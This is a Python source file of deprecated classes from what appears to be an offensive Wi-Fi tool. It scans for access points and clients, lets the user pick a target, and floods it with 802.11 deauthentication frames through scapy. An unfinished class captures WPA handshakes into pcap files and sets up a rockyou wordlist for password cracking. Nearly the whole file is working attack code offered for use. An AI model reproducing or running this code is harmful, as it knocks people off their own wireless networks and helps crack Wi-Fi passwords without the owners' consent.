# THIS WILL HOUSE DEAPPRECIATED CLASSESS




# DEAPPRECIATED // THIS CLASS HAS BEEN DISCETTED AND BROKEN APART INTO 3 CLASSES
class Frame_Snatcher():
    """This class will be responsible for sniffing out frames and or pulling mac address"""


    macs = []   
    beacons = []
    num = 1 


    def __init__(self):
        pass
    


    @classmethod
    def sniff_for_targets(cls, iface="wlan0", verbose=1, timeout=15):
        """This method will be used to sniff out mac addresses using the sniff function"""


        tempt = 1   


        try:
            while True:

                console.print(f"Sniff Attempt #{tempt}", style="bold green")
                sniff(iface=iface, prn=Frame_Snatcher.packet_parser, count=0, store=0, timeout=15); time.sleep(1); tempt += 1

                
                if cls.beacons: sniff(iface=iface, prn=Frame_Snatcher.packet_parser, count=0, store=0, timeout=15); break
        

        except Exception as e: console.print(f"[bold red]\n\nException Error:[yellow] {e}"); return False

  
    @classmethod
    def packet_parser(cls, pkt):
        """This method will be called upon to then parse the given packet"""


        
        def parser(pkt):


            # COLORS
            c1 = "bold yellow"
            c2 = "bold red"
            c3 = "bold blue"
            c4 = "bold green"

            
        
            # THIS IS STRICTLY USED TO CAPTURE BEACON FRAMES // SENT FROM AP'S
            if pkt.haslayer(Dot11Beacon):


                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else "Missing SSID"
                addr1 = str(pkt[Dot11].addr1) if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = str(pkt[Dot11].addr2) if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else False
                

                vendor = DataBase.get_vendor_main(mac=addr2)
                channel = DataBase.get_channel(pkt=pkt)
                rssi = DataBase.get_rssi(pkt=pkt)
                encryption = DataBase.get_encryption(pkt=pkt)
                frequency = DataBase.get_frequency(freq=pkt[RadioTap].ChannelFrequency)


                
                # THIS IS HERE JUST TO BE HERE FRL
                if addr1 not in cls.macs and addr1:
                    

                    # ENCRYPTION, FREQUENCY -- RSSI
                    cls.beacons.append((ssid, addr1, vendor, encryption, frequency, channel, rssi))
                    cls.macs.append(addr1)
                    cls.num += 1
                    console.print(f"[{c2}][+] Found MAC addr:[{c4}] {addr1}  -  {channel}")



                # BEACON == AP FRAMES ONLY           
                if addr2 not in cls.macs and addr2 != "No":


                    cls.beacons.append((ssid, addr2, vendor, encryption, frequency, channel, rssi))
                    cls.macs.append(addr2)
                    cls.num += 1

                    console.print(f"[{c2}][+] Found MAC addr:[{c4}] {addr2}  -   {channel}") 
        

        threading.Thread(target=parser, args=(pkt,), daemon=True).start()
            

    @classmethod
    def track_clients(cls, target, iface, track=True, delay=5):
        """This method will be responsible for tracking the online clients"""


        # DESTROY ERRORS
        verbose = True
        cls.SNIFF = True

        
        # CREATE A CLIENT LIST

        def sniff_for_clients(timeout=0):
            """This will be used to sniff for clients"""


            console.print("\n -----  SNIFF STARTED  ----- ", style="bold green")
            while cls.SNIFF: sniff(iface=iface, prn=parse_for_clients, count=0, store=0, timeout=2) #timeout=timeout)
            console.print("\n -----  SNIFF ENDED  ----- ", style="bold red")



        def parse_for_clients(pkt):
            """This will be used to parse for clients"""



            if cls.SNIFF and pkt.haslayer(Dot11):

    
                addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False

                
                # VALID CLIENTS ONLY
                if addr1 == target or addr2 == target:

                    
                    if addr1 != target and addr1 not in cls.clients and addr1:

                        cls.clients.append(addr1)
                        if verbose: console.print(f"Client: {addr1} --> {target}")

                    elif addr2 != target and addr2 not in cls.clients and addr2:

                        cls.clients.append(addr2)
                        if verbose: console.print(f"Client: {addr2} --> {target}")




        threading.Thread(target=sniff_for_clients, daemon=True).start()

        

        time.sleep(10)
        while cls.SNIFF: cls.clients = []; console.print("wiped", style="bold red"); time.sleep(delay)
        
        console.print("[bold red]Killed Background thread")


    @classmethod
    def target_chooser(cls, type, table):
        """In this method the user will choose which target they want to attack"""

       
        # CREATE VARS
        data = {}
        num = 0
        error = False
        verbose = False


        table.add_column("Key", style="bold red")
        table.add_column("SSID", style="bold blue")
        table.add_column("MAC Addr", style="bold green")
        table.add_column("Vendor", style="yellow")
        table.add_column("Encryption")
        table.add_column("Frequency")
        table.add_column("Channel")
        table.add_column("Rssi", style="red")
        



        for var in cls.beacons: num +=1; data[num] = (var[1], var[5]); table.add_row(f"{num}", f"{var[0]}",  f"{var[1]}", f"{var[2]}", f"{var[3]}", f"{var[4]}", f"{var[5]}", f"{var[6]}")
            
        



        print('\n\n')
        console.print(table)
        print('\n')


        while True:
            try:
                

                if error:
                    console.print(f"\n[bold red]Enter a key[bold red] 1 - {num},[bold green] to choose your target!")
                    error = False 


                # USER CHOOSES THERE TARGET
                choice = console.input(f"[bold red]Who do you want to attack?: ").strip()

                # INT IT 
                choice = int(choice)



                if choice in range(1, num) or choice == num:
                    ssid    = data[choice][0]
                    channel = data[choice][1]
                    
                    console.print(f"\n[bold red]Target choosen:[yellow] {ssid}, channel: {channel}")

                    
                    # RETURN THE TARGET
                    return ssid, channel
                
                else: error = True
                    
                        
            except KeyError as e:
                
                if verbose: console.print(e)
                error = True

            
            except TypeError as e:

                if verbose: console.print(e)
                error = True
            
            except Exception as e:

                if verbose: console.print(f"[bold red]Exception Error:[yellow] {e}")

                if error == False: error = 1
                elif error: error += 1                
                if error == 4: console.print("Alright ur done for", style="bold red"); break
    

    @classmethod
    def client_chooser(cls, target, iface, verbose=0, timeout=120):
        """This method will be responsible for grabbing the single client on the target <-- TYPE 1"""

        
        # VARS
        clients = []
        clients_info = []
        verbose = True


        # CREATE TABLE
        table = Table(title="Client List", title_style="bold red", style="bold purple", border_style="purple", header_style="bold red")
        table.add_column("#")
        table.add_column("MAC Addr", style="bold blue")
        table.add_column("-->", style="bold red")
        table.add_column("AP", style="bold green")
        table.add_column("Vendor", style="bold yellow")


        
        # SNIFF FOR CLIENTS FIRST
        def small_deauth():
            """Send a deauth packet and sniff the reconnected macs"""

            sent = 0


            # DELAY WAIT FOR SNIFF
            time.sleep(3)


            # FUNCTION
            while sent < 10:

                # RANDOMIZE THE DEAUTH
                reasons = random.choice([4,5,7,15])
                
                # CRAFT THE FRAME
                frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
                

                # SEND THE FRAME
                sendp(frame, iface=iface, verbose=False)


                # WAIT
                time.sleep(1)


                # GO
                sent += 1

                if verbose:
                    console.print(f"Deauth --> {target}  -  Reason: {reasons}", style="bold red")


        def client_sniffer(pkt):
            """This will sniff client macs connected to the target"""

            
            # CATCH
            try:

                # FILTER FOR DOT11 FRAMES
                if pkt.haslayer(Dot11):

                    
                    # COLLECT ADDR1 & ADDR2
                    addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                    addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False

                    

                    # CHECK FOR TARGET
                    if addr1 == target or addr2 == target:

                        

                        # ADDR1
                        if addr1 != target and addr1 not in clients and addr1:


                            # GET VENDOR
                            vendor = Utilities.get_vendor(mac=addr1)
                            
                            # APPEND TO LIST
                            clients.append(addr1)

                            # FOR INFO
                            clients_info.append((addr2, vendor))


                            # ADD DATA TO TABLE
                            table.add_row(f"{len(clients)}", f"{addr1}", " --> ", f"{target}", f"{vendor}")

                        
                        
                        # ADDR2
                        elif addr2 != target and addr2 not in clients and addr2:


                            # GET VENDOR
                            vendor = Utilities.get_vendor(mac=addr2)

                            
                            # APPEND TO LIST
                            clients.append(addr2)

                            # FOR INFO
                            clients_info.append((addr2, vendor))


                            # ADD DATA TO TABLE
                            table.add_row(f"{len(clients)}", f"{addr2}", " --> ", f"{target}", f"{vendor}")



            # BREAK
            except KeyboardInterrupt as e:
                console.print(f"[bold red]YOU ESCAPED THE MATRIX:[yellow] {e}")                
            
            
            # ERROR
            except Exception as e:
                console.print(f"[bold red]Exception Error:[yellow] {e}")


    

        # START A BACKGROUND THREAD
        threading.Thread(target=small_deauth, daemon=True).start()


        # SNIFF RESULTS
        #sniffed = 0
        #while sniffed < 60:
        console.print(f"\nI will now begin to sniff for clients for the next {timeout} seconds if you want to stop earlier press [bold green]ctrl + c!\n", style="bold red")
        time.sleep(2)

        # SNIFF
        with Live(table, console=console, refresh_per_second=2):
            sniff(iface=cls.iface, prn=client_sniffer, store=0, count=0, timeout=timeout)
        

        
        data = {}
        num = 0
        error = False
        for client in clients:

            # NUM
            num += 1

            # ADD DATA
            data[num] = client
        
        console.print(data)

        # DESTROY ERRORS
        while True:
            try:
                
                
                # FOR CLEANER OUTPUT
                if error:
                    console.print(f"\n[bold red]Enter a key[bold red] 1 - {num},[bold green] to choose your target!")
                    error = False 


                # USER CHOOSES THERE TARGET
                choice = console.input(f"[bold red]Who do you want to attack?: ").strip()

                # INT IT 
                choice = int(choice)



                if choice in range(1, num) or choice == num:
                    target = data[choice]


                    console.print(f"\n[bold red]Target choosen:[yellow] {target}")

                    
                    # RETURN THE TARGET
                    return target
                
                

                # OUTSIDE OF NUM
                else:
                    error = True
                    
            
            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except KeyError as e:
                
                if verbose:
                    console.print(e)


                error = True

            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except TypeError as e:

                if verbose:
                    console.print(e)


                error = True
            

        
            
            # ELSE
            except Exception as e:

                if verbose:

                    console.print(f"[bold red]Exception Error:[yellow] {e}")

                
                if error == False:
                    error = 1
                
                elif error:
                    error += 1
                

                # SAFETY CATCH
                if error == 4:

                    console.print("Alright ur done for", style="bold red")
                    break


    @classmethod
    def target_attacker(cls, target, client="ff:ff:ff:ff:ff:ff", verbose=1, iface="wlan0", inter=0.1, count=25):
        """This method will be responsible for attacking the choosen target"""


        # VARS
        packets_sent = 0
        error        = 0
        STAY         = True
        cls.SNIFF    = True


        # NOW TO TRACK THE AMOUNT OF CLIENTS ON THE AP
        threading.Thread(target=Frame_Snatcher.track_clients, args=(target, cls.iface), daemon=True).start()

        
        # BEGINNING OF THE END
        use = 2
        if use == 1:
            console.print(f"\n[bold red]Now Launching Attack on:[bold green] {target}\n\n")
        elif use == 2:
            console.print(f"\n[bold red]Attacking  ----->  [bold green]{target}[/bold green]  <-----  Attacking\n\n")

        time.sleep(2)



        # CREATE LIVE PANEL
        down = 5
        panel = Panel(renderable=f"Launching Attack in {down}", style="bold yellow", border_style="bold red", expand=False, title="Attack Status")




        # LOOP UNTIL CTRL + C
        with Live(panel, console=console, refresh_per_second=4):


            # UPDATE RENDERABLE THIS IS THE COUNTDOWN UNTIL START
            while down > 0:
                
                # OUTPUT N UPDATE
                panel.renderable = f"Launching Attack in: {down}"
                down -= 1
                
                # NOW FOR THE ACTUAL DELAY LOL
                time.sleep(1)
            
            
            # NOW FOR THE ATTACK
            while STAY:
                try:


                    
                    # GET REASON FOR BEING KICKED OFF / CHOOSE DIFFERENT ONES IN CASE SOME WORK BETTER THEN OTHERS
                    reasons = random.choice([4,5,7,15])

                    # CREATE THE LAYER 2 FRAME
                    frame = RadioTap() / Dot11(addr1=client, addr2=target, addr3=target) / Dot11Deauth(reason=reasons)


                    # NOW TO SEND THE FRAME
                    sendp(frame, iface=iface, inter=inter, count=count, verbose=verbose)
                    time.sleep(0.4)

                    

                    # UPDATE VAR & PANEL
                    packets_sent += count

                    # COLORS
                    c1 = "bold red"

                    panel.renderable = (
                        f"[{c1}]Target:[/{c1}] {target}  -  " 
                        f"[{c1}]Client:[/{c1}] {client}  -  " 
                        f"[{c1}]Total Frames Sent:[/{c1}] {packets_sent}  -  "  
                        f"[{c1}]Reason:[/{c1}] {reasons}  -  "  
                        f"[{c1}]Clients:[/{c1}] {len(cls.clients)}"

                        )

                    
            


                except KeyboardInterrupt as e:
                    console.print(e)

                    
                    # WAIT
                    while STAY:
                        try:
                            console.print(f"Cleaning up", style="bold red")
                            time.sleep(1)

                            STAY      = False       # BREAK NESTED LOOP
                            cls.SNIFF = False  # KILL BACKGROUND THREAD 
                            cls.GO    = False   
                            break             # JUST IN CASE
                        

                        except KeyboardInterrupt as e:
                            console.print("STOP PRESSING ctrl + c", style="bold red")
                        

                

                except Exception as e:
                    console.print(f"[bold red]Exception Error:[yellow] {e}")
                    STAY      = False
                    cls.SNIFF = False
                    console.print("[bold red]Killing & Refreshing [bold green]Instance")
                    time.sleep(2); break
                    
    
    @classmethod
    def main(cls, type, skip=False):
        """This is where the module will spawn from"""



        # CLEAN VARS
        cls.macs = []
        cls.beacons = []
        cls.num = 1
        cls.clients = []
        cls.GO = True

        
        # CATCH YOU 
        try:

            # GET GLOBAL IFACE
            cls.iface = Frame_Snatcher.get_interface()
            

            # START AUTO HOPPER // FOR NOW
            Background_Threads.channel_hopper(verbose=False)

            
            # SNIFF FOR TARGETS
            Frame_Snatcher.sniff_for_targets(iface=cls.iface)
            Background_Threads.hop = False


            # ALLOW THE USER TO CHOOSE THERE TARGET
            target, channel = Frame_Snatcher.target_chooser(type=type)


            # HOP CHANNELS
            Background_Threads.channel_hopper(set_channel=channel)


            # ALL CLIENT ATTACK
            if type == 2:

                # ATTACK ALL CLIENTS ON TARGET
                console.print("on", channel)
                while cls.GO: Frame_Snatcher.target_attacker(target=target, iface=cls.iface); time.sleep(3); Background_Threads.channel_hopper(set_channel=channel)


            # SINGLE CLIENT 
            elif type == 1:

                # SNAG CLIENT
                console.print("on", channel)
                client = Frame_Snatcher.client_chooser(target=target, iface=cls.iface)
                
                # NOW ATTACK CLIENT ON TARGET
                while cls.GO: Frame_Snatcher.target_attacker(target=target, client=client, iface=cls.iface); Background_Threads.channel_hopper(set_channel=channel)
                            


            # LEAVE
            time.sleep(.2);  console.input("\n\n[bold green]Press Enter to Return: ")
        

        
        except KeyboardInterrupt as e:
            console.print(e)



        except Exception as e:
            console.print(f'[bold red]Exception Error:[yellow] {e}')   







# =======================================
# THE CLASSESS BELOW WE WILL GET TO LAST
# =======================================

# THIS CLASS WILL BE A STANDALONE VERSION FOR TESTING OF NON-CONNECTED WIFI CLIENT SNIFFING.
class Client_Sniffer_old():
    """This class will be responsible for sniffing clients on targeted network"""



    @classmethod
    def sniff_for_targets(cls, iface):
        """This module will be responsible for sniffing for targets"""

        count = 1

        try:

            while True:


                console.print(f"[bold yellow]Sniff Attempt[bold yellow] [bold green]#{count}")

                sniff(iface=iface, prn=Client_Sniffer.packet_parser, store=0, timeout=15)


                if len(cls.ssids) > 0:


                    sniff(iface=iface, prn=Client_Sniffer.packet_parser, store=0, count=0, timeout=7)


                    break

                
                count += 1
        


        except Exception as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")

            input("hii")


            from nsm_ui import MainUI
            MainUI.main()
    

    @classmethod
    def packet_parser(cls, pkt, target=False, verbose=False):
        """This will break down and discet packets"""


        def parser(pkt):
            
            if pkt.haslayer(Dot11Beacon) and cls.type == 1:


                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else False
                
                addr1 = pkt[Dot11].addr1 if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt[Dot11].addr2 if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else False

                

                if addr2 and ssid and addr2 not in cls.macs:

                    cls.macs.append(addr2)


                    channel = Background_Threads.get_channel(pkt=pkt)
                    vendor = Utilities.get_vendor(mac=addr2)
                    rssi = NetTilities.get_rssi(pkt=pkt)
                    encryption = Background_Threads.get_encryption(pkt=pkt)
                    freq = Background_Threads.get_freq(freq=pkt[RadioTap].ChannelFrequency)



            
        
                    cls.infos.append((ssid, addr2, vendor, encryption, freq, channel, rssi))
                    cls.ssids[addr2] = channel

                    console.print(f"[bold red]Snatched your SSID:[bold yellow] {ssid}")


                    

                   # if cls.ssids[addr2] == None: 

                        #cls.infos.remove((ssid, addr2, vendor, channel, rssi))
                        #cls.infos.pop()
                       # cls.macs.remove(addr2)

                    



            elif pkt.haslayer(Dot11) and cls.type == 2:


                addr1 = pkt[Dot11].addr1 if pkt[Dot11].addr1 else False
                addr2 = pkt[Dot11].addr2 if pkt[Dot11].addr2 else False

     
                 
                if addr2 == cls.target or addr1 == target:



                    console.print(f"Client: {addr2}  -->  {addr1}")

                    
                    if addr2 not in cls.clients:
                        
                        cls.clients.append(addr2 if addr2 else addr1)
                    
                    

      
      
        if cls.SNIFF:
            threading.Thread(target=parser, args=(pkt, ), daemon=True).start()

    
    @classmethod
    def target_chooser(cls, verbose=False):
        """This method will be used to choose from the target list"""


        num = 1
        data = {}
        error = False
        time.sleep(2)


        table = Table(title="Choose Bitch", border_style="bold red", style="bold purple", title_style="bold purple", header_style="bold purple")
        table.add_column("Key")
        table.add_column("SSID", style="bold blue")
        table.add_column("BSSID", style="bold green")
        table.add_column("Vendor", style="yellow")
        table.add_column("Encryption")
        table.add_column("Frequency")
        table.add_column("Channel")
        table.add_column("Rssi", style="bold red")



        for var in cls.infos:


            ssid = var[0]
            bssid = var[1]
            vendor = var[2]
            encryption = "WPA2"
            freq = var[4]
            channel = var[5]
            rssi = var[6]

            # ADD TO DICT
            data[num] = (var[0], var[1])


            table.add_row(f"{num}", f"{ssid}", f"{bssid}", f"{vendor}", f"{encryption}", f"{freq}", f"{channel}", f"{rssi}")
            num += 1

        


        
        print('\n\n'); console.print(table); print('\n')

        
        # DESTROY ERRORS
        while True:
            try:
                
                
                # FOR CLEANER OUTPUT
                if error:
                    console.print(f"\n[bold red]Enter a key[bold red] 1 - {num},[bold green] to choose your target!")
                    error = False 


                # USER CHOOSES THERE TARGET
                choice = console.input(f"[bold red]Who do you want to attack?: ").strip()

                # INT IT 
                choice = int(choice)



                if choice in range(1, num) or choice == num:
                    ssid = data[choice][0]
                    target = data[choice][1]
                    channel = cls.ssids[target]


                    console.print(f"\n[bold red]Target choosen:[yellow] {target}")

                    
                    # RETURN THE TARGET
                    return ssid, target, channel
                
                

                # OUTSIDE OF NUM
                else:
                    error = True
                    
            
            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except KeyError as e:
                
                if verbose:
                    console.print(e)


                error = True

            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except TypeError as e:

                if verbose:
                    console.print(e)


                error = True
            

        
            
            # ELSE
            except Exception as e:

                if verbose:

                    console.print(f"[bold red]Exception Error:[yellow] {e}")

                
                if error == False:
                    error = 1
                
                elif error:
                    error += 1
                

                # SAFETY CATCH
                if error == 4:

                    console.print("Alright ur done for", style="bold red")
                    break
    

    @classmethod
    def sniff_the_target(cls, iface, ssid, target, channel):
        """This will sniff only from target"""


        cls.type = 2
        cls.target = target


        # SET CHANNEL
        Background_Threads.channel_hopper(set_channel=channel)

        
        # VARS
        clients = []
        clients_info = []
        verbose = True


        # CREATE TABLE
        table = Table(title=f"{ssid} - Client List", title_style="bold red", style="bold purple", border_style="purple", header_style="bold red")
        table.add_column("#")
        table.add_column("MAC Addr", style="bold blue")
        table.add_column("-->", style="bold red")
        table.add_column("AP", style="bold green")
        table.add_column("Vendor", style="bold yellow")


        
        # SNIFF FOR CLIENTS FIRST
        def small_deauth():
            """Send a deauth packet and sniff the reconnected macs"""

            sent = 0


            # DELAY WAIT FOR SNIFF
            time.sleep(3)


            # FUNCTION
            while sent < 10:

                # RANDOMIZE THE DEAUTH
                reasons = random.choice([4,5,7,15])
                
                # CRAFT THE FRAME
                frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
                

                # SEND THE FRAME
                #while True:
                sendp(frame, iface=iface, count=15, realtime=False,verbose=False)
       

                # WAIT
                time.sleep(1)


                # GO
                sent += 1

                if verbose:
                    console.print(f"Deauth --> {target}  -  Reason: {reasons}", style="bold red")


        def client_sniffer(pkt):
            """This will sniff client macs connected to the target"""

            
            # CATCH
            try:

                # FILTER FOR DOT11 FRAMES
                if pkt.haslayer(Dot11):

                    
                    # COLLECT ADDR1 & ADDR2
                    addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                    addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False

                    

                    # CHECK FOR TARGET
                    if addr1 == target or addr2 == target:

                        

                        # ADDR1
                        if addr1 != target and addr1 not in clients and addr1:


                            # GET VENDOR
                            vendor = Utilities.get_vendor(mac=addr1)
                            
                            # APPEND TO LIST
                            clients.append(addr1)

                            # FOR INFO
                            clients_info.append((addr2, vendor))


                            # ADD DATA TO TABLE
                            table.add_row(f"{len(clients)}", f"{addr1}", " --> ", f"{target}", f"{vendor}")

                        
                        
                        # ADDR2
                        elif addr2 != target and addr2 not in clients and addr2:


                            # GET VENDOR
                            vendor = Utilities.get_vendor(mac=addr2)

                            
                            # APPEND TO LIST
                            clients.append(addr2)

                            # FOR INFO
                            clients_info.append((addr2, vendor))


                            # ADD DATA TO TABLE
                            table.add_row(f"{len(clients)}", f"{addr2}", " --> ", f"{target}", f"{vendor}")



            # BREAK
            except KeyboardInterrupt as e:
                console.print(f"[bold red]YOU ESCAPED THE MATRIX:[yellow] {e}")                
            
            
            # ERROR
            except Exception as e:
                console.print(f"[bold red]Exception Error:[yellow] {e}")


        

        try:

            # START A BACKGROUND THREAD
            threading.Thread(target=small_deauth, daemon=True).start()


            console.print(f"\nI will now begin to sniff for clients for the next 'infinite' seconds if you want to stop earlier press [bold green]ctrl + c!\n", style="bold red")
            time.sleep(2)

            # SNIFF
            with Live(table, console=console, refresh_per_second=2):
                sniff(iface=iface, prn=client_sniffer, store=0, count=0)


                time.sleep(1.1)
        


        except KeyboardInterrupt as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")

            time.sleep(1)
            console.input("\n[bold red]Press Enter to EXIT: ")
        

        except Exception as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")


    @classmethod
    def main(cls):
        """This is where main logic will be launched from"""


        # SET VARS
        cls.infos = []
        cls.ssids = {}
        cls.macs = []
        cls.clients = []
        cls.type = 1
        cls.SNIFF = True
        Background_Threads.hop = True



        # GET IFACE
        try:


            iface = Variables.iface

            Background_Threads.channel_hopper(verbose=False)

            Client_Sniffer.sniff_for_targets(iface=iface)

            ssid, target, channel = Client_Sniffer.target_chooser()

            Client_Sniffer.sniff_the_target(iface=iface, ssid=ssid, target=target, channel=channel)
        


        except KeyboardInterrupt as e: console.print(f"[bold red]Exception Error:[bold yellow] {e}"); cls.SNIFF = False
        except Exception as e: console.print(f"[bold red]Exception Error:[bold yellow] {e}"); cls.SNIFF = False


# THIS CLASS IS STRICTLY TO BE USED AS A VICTIM NODE TO TEST IF THIS MODULE IS FUNCTIONAL 
class You_Cant_DOS_ME():
    """This is testing ground for weather or not i can withstand a ddos attack"""


    def __init__(self):
        pass


    @classmethod
    def ping(cls, host="google.com", timeout=4, verbose=False):
        """Create the ping packet and send it out"""


        # PRINT WELCOME
        text = pyfiglet.figlet_format(text="DOS\n ME", font="bloody")
        console.print(text, style="bold red")

        console.input("\n[bold red]ARE U READY ?: ")
        
        online = True
        pings = 0

        # TALK SHII FOR FUN
        talks = [
            "You can't hit me offline — I host the cloud.",
            "Yawn... I'm still online.",
            "Your net too slow to even scan me.",
            "My packets run laps around yours.",
            "Bro I deauth for fun.",
            "Your IP is giving home router energy.",
            "My Wi-Fi's got better uptime than your excuses.",
            "I don't lag — I throttle reality.",
            "My ping is lower than your standards.",
            "Try harder... I'm behind 3 VPNs and your girl’s Wi-Fi.",
            "You scan ports, I open wormholes.",
            "Your whole setup runs on hope and Starbucks Wi-Fi.",
            "Deauth me? I deauth back with feelings.",
            "Nice packet — shame it never reached me.",
            "You can’t trace me — I lost myself years ago."
        ]


        try:
            

            ip = socket.gethostbyname(str(host))
            console.print(ip)
            ping = IP(dst=ip) / ICMP()
            console.print(ping)



        except KeyboardInterrupt as e: console.print(e); return
        except Exception as e: console.print(f"[bold red]Socket Exception Error: {e}"); return
        
            
        while online:

            try:
            

                time_start = time.time()
                response = sr1(ping, timeout=timeout, verbose=verbose)

                time_took = time.time() - time_start

                
                if response:console.print(f"[bold blue]Connection Status: [bold green]Online  -  Latency: {time_took:.2f}")
                else: console.print(f"[bold blue]Connection Status: [bold red]Offline  -  I HATE YOU")



                    
                pings += 1 
                if time_took < 1.0: time.sleep(1.5)


                ran = random.randint(0,10)

                if ran == 4: console.print(talks[random.randint(0,14)])
            
            
            except KeyboardInterrupt as e: console.print("\n",e); break
            except Exception as e: console.print(f"[bold red]Exception Error: {e}")




# THIS CLASS IS NOT DONE YET
class Hash_Snatcher():
    """This method will snatch handshakes out the air and potentially pass them to hashcat"""


    # USE THIS TO KILL BACKGROUND THREAD
    SNIFF = True

    
    def __init__(self):
        pass

    


    @classmethod
    def _sniff_for_ap(cls, iface, timeout=15):
        """This will sniif for APs in the area"""


        def sniffer():
            """This will sniff"""


            count = 0      

            while True:

                try:

                    count += 1; console.print(f"Sniff Attempt #{count}", style="bold red")
                    
                    sniff(iface=iface, store=0, timeout=timeout, prn=parser)
                    time.sleep(1)
                    if cls.ssids: sniff(iface=iface, store=0, timeout=timeout, prn=parser); break
                
                
                except KeyboardInterrupt: return KeyboardInterrupt
                except Exception as e: console.print(f"\n[bold red]Sniffer exception Error:[bold yellow] {e}"); return Exception


        def parser(pkt):
            """Parse packets"""

  
            if pkt.haslayer(Dot11Beacon):
                
                addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False

                channel = Background_Threads.get_channel(pkt=pkt)
                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else "Hidden SSID"
                



                if addr2 and ssid not in cls.ssids:

                    console.print(f"[bold red][+] SSID Found:[bold yellow] {ssid}")
                    cls.mac_ifo.append((len(cls.ssids), ssid, addr2, channel))
                    cls.ssids.append(ssid)
    

        sniffer()

    

    @classmethod
    def _choose_ap(cls):
        """Choose target"""

        
        max = len(cls.ssids)
        console.print(cls.mac_ifo)

                
        while True:
            try:

                choice = console.input("\n[bold yellow]Choose a AP!: "); choice = int(choice)
    
                
                if 0 <= choice <= max: 
                    num     = cls.mac_ifo[choice][0]
                    ssid    = cls.mac_ifo[choice][1]
                    bssid   = cls.mac_ifo[choice][2]
                    channel = cls.mac_ifo[choice][3]

                    cls.target = [ssid, bssid]

                    console.print(f"\n[bold green][+] Target -->[bold yellow] {cls.ssids[num]}"); return ssid, bssid, channel

            
            except (KeyError, TypeError) as e: console.print(f"[bold red][-]Error:[bold yellow] {e}")
            

            except Exception as e: console.print(f"[bold red][-] Exception Error:[bold yellow] {e}")


    
    @classmethod
    def _target_attacker(cls, iface, target, client="ff:ff:ff:ff:ff:ff", verbose=False, delay=5):
        """This will send deauth packets to AP clients"""

  
        frames = []
        sent = 0
        console.print("\n --- DEAUTH STARTED --- ", style="bold green")

        reasons = [4,5,7,15]
        for reason in reasons:
            frame = RadioTap() / Dot11(addr1=client, addr2=target, addr3=target) / Dot11Deauth(reason=reason)
            frames.append(frame)
            console.print(f"[bold green]Frame created:[/bold green] {frame}")

        print('\n'); time.sleep(2)
        while cls.sniff:
                
            try:
                
                if cls.sniff:
                    sendp(frames, iface=iface, verbose=verbose, realtime=1, count=50)

                    console.print(f"[bold red]Deauth -->[bold yellow] {target}", style="bold red")

                    sent += 1; time.sleep(delay)


            except KeyboardInterrupt as e: console.print(f"[bold red]target_attacker module Error:[bold yellow] {e}"); cls.sniff  = False; return KeyboardInterrupt
            
            except Exception as e:         console.print(f"[bold red]target_attacker module Exception Error:[bold yellow] {e}")
    

        console.print("\n --- DEAUTH ENDED --- ", style="bold red")



    @classmethod
    def _sniff_for_hashes(cls, iface, timeout=60):
        """This method will be responsibe sniffing handshakes"""

        
        stay = True
        handshake = False
        cls.eapol_frames = []
        time.sleep(.5)
        
        
        def sniffer(stay=stay, handshake=handshake):
            """This will sniff"""


            console.print("\n ---  HASH SNIFF STARTED  --- ", style="bold green")

            while stay:

                try:
      
                    sniff(iface=iface, prn=parser, store=0, timeout=timeout)

                    time.sleep(1)#; console.print("Still Sniffing --> hashes\n", style="bold green")
                
                
                except KeyboardInterrupt as e: 
                    console.print("\n ---  HASH SNIFF ENDED  --- ", style="bold red")
                    stay = False
                    cls.sniff = False
                    return KeyboardInterrupt

                except Exception as e:
                    console.print(f"[bold red]Exception Error:[yellow] {e}")
                    stay = False
                    cls.sniff = False  # KILL BACKGROUND THREAD 

            

            console.print("\n ---  HASH SNIFF ENDED  --- ", style="bold red")
        

        def file_enumerator(path, client=False, ap=False, verbose=True):
            """This will find a valid file path and store name of ssid for file path in txt"""

            num = 1
            txt_path = path / "verbose.txt"
            file = path / f"handshake_{num}.pcap"
            output_path = path / f"capture_{num}.16800"
            wordlist_path = path / "rockyou.txt"
            
            while True:

                if not file.exists():
                    
                    if client and ap:
                        
                        time_stamp = datetime.now().strftime("%m/%d/%Y - %H:%M:%S")
                        message = f"\nTimestamp: {time_stamp} - handshake_{num}.pcap -->  AP: {ap}  |  Client: {client}  <--> SSID: {cls.target[0]}"

                        try:

                            with open(txt_path, "a") as f: f.write(message) 
                        
                        except (FileNotFoundError, FileExistsError) as e: console.print(f"[bold red][-] File Error:[bold yellow] {e}")
                        except Exception as e: console.print(f"[bold red][-] Exception Error:[bold yellow] {e}")


                    if verbose: console.print(f"[bold yellow][*] File --> {file}")
                    return file, output_path, wordlist_path


                num += 1;  file = path / f"handshake_{num}.pcap"; output_path = path / f"capture_{num}.16800"


        def hash_converter(handshake_path, output_path):
